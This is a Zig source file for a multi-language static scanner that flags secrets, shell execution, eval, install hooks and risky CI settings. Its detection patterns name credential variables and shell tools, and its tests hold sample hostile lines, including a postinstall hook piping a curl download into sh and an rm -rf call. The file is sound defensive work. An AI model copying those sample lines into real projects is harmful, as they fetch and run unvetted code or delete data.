const std = @import("std");
const findings = @import("findings.zig");
const modes = @import("../language/modes.zig");

pub const ScanOptions = struct {
    path: []const u8 = "(memory)",
    language: modes.LanguageMode = .unknown,
};

pub fn isInterestingPath(path: []const u8, language: modes.LanguageMode) bool {
    if (modes.isZigFamily(language)) return false;
    if (modes.isCode(language)) return true;
    if (language == .env or language == .dockerfile or language == .makefile or language == .json or language == .yaml or language == .toml) return true;
    const base = std.fs.path.basename(path);
    return std.mem.eql(u8, base, "package.json") or
        std.mem.eql(u8, base, "requirements.txt") or
        std.mem.eql(u8, base, "Gemfile") or
        std.mem.eql(u8, base, "composer.json") or
        std.mem.eql(u8, base, "pom.xml") or
        std.mem.eql(u8, base, "build.gradle") or
        std.mem.eql(u8, base, "build.gradle.kts");
}

pub fn scanSource(allocator: std.mem.Allocator, source: []const u8, options: ScanOptions) !findings.Collection {
    var collection = findings.Collection.init(allocator);
    errdefer collection.deinit();

    var line_iter = std.mem.splitScalar(u8, source, '\n');
    var line_number: usize = 0;
    while (line_iter.next()) |raw_line| : (line_number += 1) {
        const line = std.mem.trim(u8, raw_line, "\r");
        try scanGenericLine(&collection, options.path, line, line_number);
        try scanLanguageLine(&collection, options, line, line_number);
    }

    return collection;
}

fn scanGenericLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    try detectSecret(collection, path, line, line_number, "PRIVATE KEY", .critical, "private key material appears in workspace text");
    try detectSecret(collection, path, line, line_number, "AWS_SECRET_ACCESS_KEY", .critical, "AWS secret key appears in workspace text");
    try detectSecret(collection, path, line, line_number, "GITHUB_TOKEN", .high, "GitHub token-like variable appears in workspace text");
    try detectSecret(collection, path, line, line_number, "api_key", .high, "API key-like assignment appears in workspace text");
    try detectSecret(collection, path, line, line_number, "password=", .high, "password-like assignment appears in workspace text");
    try detectSecret(collection, path, line, line_number, "token=", .medium, "token-like assignment appears in workspace text");

    if (hasPipeToShell(line)) |column| {
        try collection.append(.polyglot_trust, .high, path, line_number, column, "download piped directly into a shell", line);
    }
}

fn scanLanguageLine(collection: *findings.Collection, options: ScanOptions, line: []const u8, line_number: usize) !void {
    const path = options.path;
    switch (options.language) {
        .javascript, .jsx, .typescript, .tsx => {
            try detect(collection, path, line, line_number, "child_process", .high, "JS/TS can spawn child processes");
            try detect(collection, path, line, line_number, "eval(", .high, "dynamic evaluation boundary detected");
            try detect(collection, path, line, line_number, "new Function", .high, "dynamic function construction boundary detected");
            try detect(collection, path, line, line_number, "\"postinstall\"", .high, "package script runs during dependency install");
            try detect(collection, path, line, line_number, "\"preinstall\"", .high, "package script runs before dependency install");
        },
        .python => {
            try detect(collection, path, line, line_number, "subprocess.", .high, "Python subprocess boundary detected");
            try detect(collection, path, line, line_number, "os.system(", .high, "Python shell execution boundary detected");
            try detect(collection, path, line, line_number, "eval(", .high, "Python eval boundary detected");
            try detect(collection, path, line, line_number, "exec(", .high, "Python exec boundary detected");
            try detect(collection, path, line, line_number, "pickle.load", .medium, "pickle deserialization boundary detected");
        },
        .shell, .powershell => {
            try detect(collection, path, line, line_number, "rm -rf", .high, "recursive deletion command should be reviewed");
            try detect(collection, path, line, line_number, "Remove-Item", .medium, "PowerShell removal command should be reviewed");
            try detect(collection, path, line, line_number, "Invoke-Expression", .high, "PowerShell dynamic execution boundary detected");
            try detect(collection, path, line, line_number, "iex ", .high, "PowerShell dynamic execution boundary detected");
        },
        .c, .cpp => {
            try detect(collection, path, line, line_number, "system(", .high, "C/C++ shell execution boundary detected");
            try detect(collection, path, line, line_number, "popen(", .high, "C/C++ process pipe boundary detected");
            try detect(collection, path, line, line_number, "gets(", .critical, "unsafe C input function detected");
            try detect(collection, path, line, line_number, "strcpy(", .medium, "unchecked copy should be reviewed");
        },
        .rust => {
            try detect(collection, path, line, line_number, "unsafe", .medium, "Rust unsafe boundary detected");
            try detect(collection, path, line, line_number, "std::process::Command", .high, "Rust process execution boundary detected");
        },
        .go => {
            try detect(collection, path, line, line_number, "os/exec", .high, "Go process execution package imported");
            try detect(collection, path, line, line_number, "syscall.", .medium, "Go syscall boundary detected");
            try detect(collection, path, line, line_number, "unsafe.", .medium, "Go unsafe package boundary detected");
        },
        .php => {
            try detect(collection, path, line, line_number, "eval(", .high, "PHP eval boundary detected");
            try detect(collection, path, line, line_number, "shell_exec", .high, "PHP shell execution boundary detected");
            try detect(collection, path, line, line_number, "system(", .high, "PHP shell execution boundary detected");
        },
        .ruby => {
            try detect(collection, path, line, line_number, "eval(", .high, "Ruby eval boundary detected");
            try detect(collection, path, line, line_number, "system(", .high, "Ruby shell execution boundary detected");
            try detect(collection, path, line, line_number, "Open3", .medium, "Ruby process boundary detected");
        },
        .dockerfile => {
            try detect(collection, path, line, line_number, "ADD http://", .high, "Dockerfile fetches remote content without TLS");
            try detect(collection, path, line, line_number, "ADD https://", .medium, "Dockerfile fetches remote content during build");
            try detect(collection, path, line, line_number, ":latest", .medium, "floating Docker tag should be pinned for reproducibility");
        },
        .makefile => {
            try detect(collection, path, line, line_number, "sudo ", .medium, "Makefile target invokes sudo");
            try detect(collection, path, line, line_number, "rm -rf", .high, "Makefile target performs recursive deletion");
            try detect(collection, path, line, line_number, "curl ", .medium, "Makefile target downloads remote content");
        },
        .yaml => {
            if (indexOfIgnoreCase(path, ".github") != null) {
                try detect(collection, path, line, line_number, "pull_request_target", .high, "GitHub Actions pull_request_target expands trust boundary");
                try detect(collection, path, line, line_number, "permissions: write-all", .high, "GitHub Actions grants broad write permissions");
            }
        },
        else => {},
    }
}

fn detect(
    collection: *findings.Collection,
    path: []const u8,
    line: []const u8,
    line_number: usize,
    needle: []const u8,
    risk: findings.Risk,
    message: []const u8,
) !void {
    if (indexOfIgnoreCase(line, needle)) |column| {
        try collection.append(.polyglot_trust, risk, path, line_number, column, message, line);
    }
}

fn detectSecret(
    collection: *findings.Collection,
    path: []const u8,
    line: []const u8,
    line_number: usize,
    needle: []const u8,
    risk: findings.Risk,
    message: []const u8,
) !void {
    if (indexOfIgnoreCase(line, needle)) |column| {
        try collection.append(.secret_flow, risk, path, line_number, column, message, line);
    }
}

fn hasPipeToShell(line: []const u8) ?usize {
    const download = indexOfIgnoreCase(line, "curl") orelse indexOfIgnoreCase(line, "wget") orelse return null;
    if (std.mem.indexOfScalar(u8, line, '|') == null) return null;
    if (indexOfIgnoreCase(line, " sh") != null or indexOfIgnoreCase(line, " bash") != null or indexOfIgnoreCase(line, "pwsh") != null) return download;
    return null;
}

fn indexOfIgnoreCase(haystack: []const u8, needle: []const u8) ?usize {
    if (needle.len == 0) return 0;
    var i: usize = 0;
    while (i + needle.len <= haystack.len) : (i += 1) {
        if (std.ascii.eqlIgnoreCase(haystack[i .. i + needle.len], needle)) return i;
    }
    return null;
}

test "polyglot scanner detects script execution boundaries" {
    var collection = try scanSource(std.testing.allocator,
        \\const cp = require("child_process");
        \\eval(userInput);
        \\"postinstall": "curl https://example.test/install.sh | sh"
        \\
    , .{ .path = "package.json", .language = .javascript });
    defer collection.deinit();

    try std.testing.expect(collection.countRiskAtLeast(.high) >= 3);
}

test "polyglot scanner detects native and secret boundaries" {
    var collection = try scanSource(std.testing.allocator,
        \\const char* token = "AWS_SECRET_ACCESS_KEY";
        \\system("rm -rf /tmp/x");
        \\gets(buf);
        \\
    , .{ .path = "main.c", .language = .c });
    defer collection.deinit();

    try std.testing.expect(collection.countRiskAtLeast(.critical) >= 2);
}
